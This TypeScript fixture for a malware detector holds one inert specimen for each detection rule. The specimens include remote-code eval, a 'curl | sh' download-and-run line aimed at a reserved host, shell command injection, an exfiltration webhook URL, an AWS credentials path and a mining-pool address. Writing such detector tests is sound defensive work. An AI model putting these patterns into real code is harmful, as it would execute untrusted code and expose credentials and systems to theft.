/* Inert detector fixture — NOT a working program and never invoked. Each line below is an
   isolated specimen that trips exactly one TS-MAL rule's static signal; every live network
   target is RFC-reserved (`*.invalid`) and the exfil-sink specimen is an anonymized webhook
   with a zeroed id that captures nothing, no file is ever opened (the credential path is a
   bare string), and nothing here executes. Lives under `src/` so the malware category stays at
   production strength (never relaxed). */
import { execSync } from "child_process";

const ENCODED = "ZXhwb3J0IGNvbnN0IHggPSAxOw==";

export async function malwarePatternSpecimens(url: string, modName: string) {
  eval(atob(ENCODED)); // TS-MAL-OBFUSCATED-EXEC
  eval(await fetch(url).then((r) => r.text())); // TS-MAL-REMOTE-EXEC
  execSync("curl http://example.invalid/x.sh | sh"); // TS-MAL-DOWNLOAD-EXEC
  const mod = require(modName); // TS-MAL-DYNAMIC-REQUIRE
  const out = execSync(`tar -czf /tmp/a.tgz ${modName}`); // TS-MAL-EXEC-INJECTION
  const sink = "https://webhook.site/00000000-0000-0000-0000-000000000000"; // TS-MAL-EXFIL-URL
  const creds = "/home/runner/.aws/credentials"; // path string only, never opened — TS-MAL-CREDENTIAL-ACCESS
  const pool = "stratum+tcp://pool.example.invalid:4444"; // TS-MAL-CRYPTO-MINER
  const blob = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; // TS-MAL-ENCODED-BLOB
  const token = "AKIAIOSFODNN7EXAMPLE"; // AWS's documented example key, not a live secret — TS-SECRET-DETECTED
  return { mod, out, sink, creds, pool, blob, token };
}
